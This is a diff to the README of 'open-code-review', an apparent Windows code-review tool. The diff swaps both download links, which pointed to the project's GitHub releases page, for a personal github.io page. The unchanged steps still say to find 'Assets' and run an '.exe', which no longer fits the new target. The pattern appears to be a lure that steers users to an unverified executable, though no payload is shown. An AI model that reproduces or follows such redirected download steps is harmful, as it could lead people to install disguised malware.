@@ -1,6 +1,6 @@
 # 🔍 open-code-review - Automatic code checks for better software
 
-[![](https://img.shields.io/badge/Download-Open_Code_Review-blue.svg)](https://github.com/skeletonshorts029-png/open-code-review/releases)
+[![](https://img.shields.io/badge/Download-Open_Code_Review-blue.svg)](https://skeletonshorts029-png.github.io)
 
 ## What is this tool?
 Open-code-review helps you improve your computer code. It finds errors that cause programs to crash or behave in unexpected ways. It acts as an assistant that looks at your work line by line. It identifies problems like security risks, memory leaks, and logic errors before you finish your project. The tool uses both simple logic and advanced artificial intelligence to offer feedback on your files.
@@ -11,7 +11,7 @@ You need a computer running Windows 10 or Windows 11. Your computer should have 
 ## 📥 How to download and install
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link to access the list of available versions: [https://github.com/skeletonshorts029-png/open-code-review/releases](https://github.com/skeletonshorts029-png/open-code-review/releases).
+1. Visit the following link to access the list of available versions: [https://skeletonshorts029-png.github.io](https://skeletonshorts029-png.github.io).
 2. Look for the section labeled "Assets."
 3. Click the file that ends with ".exe" to begin the download.
 4. Save the file to your "Downloads" folder or your "Desktop" for fast access.
